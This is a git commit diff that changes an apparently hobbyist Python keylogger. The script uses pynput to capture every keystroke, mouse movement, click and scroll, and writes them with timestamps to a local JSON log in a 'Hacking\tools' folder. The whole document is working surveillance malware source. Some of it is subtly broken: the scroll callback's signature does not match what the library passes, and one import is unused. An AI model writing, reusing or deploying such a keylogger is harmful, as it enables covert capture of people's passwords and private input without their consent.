8b299c41583fcee7dd70be47c47a28563df10ab7
Shaurya <shauryagajjar2626@gmail.com>
2026-02-04 08:53:24 +0530

    c

--- src/scripts/key_logger.py
+++ src/scripts/key_logger.py
@@ -1,39 +1,57 @@
+from genericpath import isfile
 from pynput import keyboard, mouse
 from datetime import datetime
 from datetime import date
 from getpass import getuser
 import os
+import json
 
 folder = os.path.join("C:\\Users", getuser(), "key_logs")
+folder = r"E:\coding\Hacking\tools\src\resources"
 
 os.makedirs(folder, exist_ok=True)
 
 def write(event_type, details):
-    time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    with open(fr'{folder}\{date.today()}_keyLog.txt', "at") as f:
-        f.write(f"{time} - [{event_type}] {details}\n")
+    timestamp  = datetime.now().strftime("%Y-%m-%d (%H:%M:%S)")
+    LOG_FILE  = fr"{folder}\{date.today()}_keyLog.json"
+    
+    keylog = {}
+    
+    if os.path.isfile(LOG_FILE):
+        with open(LOG_FILE, "r") as f:
+            keylog = json.load(f)
+
+    keylog.setdefault(timestamp, [])
+    keylog[timestamp].append({
+        "type": event_type,
+        "details": details
+    })
+
+    with open(LOG_FILE, "w") as f:
+        json.dump(keylog, f, indent=2)
 
 def onPress(key):
     try:
-        write("", key.char)
+        write("Write", key.char)
     except AttributeError:
-        write("", str(key))
+        write("Write", str(key))
 
-def on_move(x, y):
+def onMove(x, y):
     write("MouseMove", f"Position: {x, y}")
 
-def on_click(x, y, button, pressed):
+def onClick(x, y, button, pressed):
     action = "Pressed" if pressed else "Released"
     write("MouseClick", f"{button} {action} at {x, y}")
 
-def on_scroll(x, y, dy):
+def onScroll(x, y, dy):
     write("MouseScroll", f"Scrolled {'down' if dy < 0 else 'up'} at {x, y}")
 
 keyboard_listener = keyboard.Listener(on_press=onPress)
-mouse_listener = mouse.Listener(on_move=on_move, on_click=on_click, on_scroll=on_scroll)
+mouse_listener = mouse.Listener(on_move=onMove, on_click=onClick, on_scroll=onScroll)
 
 keyboard_listener.start()
 mouse_listener.start()
 
 keyboard_listener.join()
 mouse_listener.join()
+
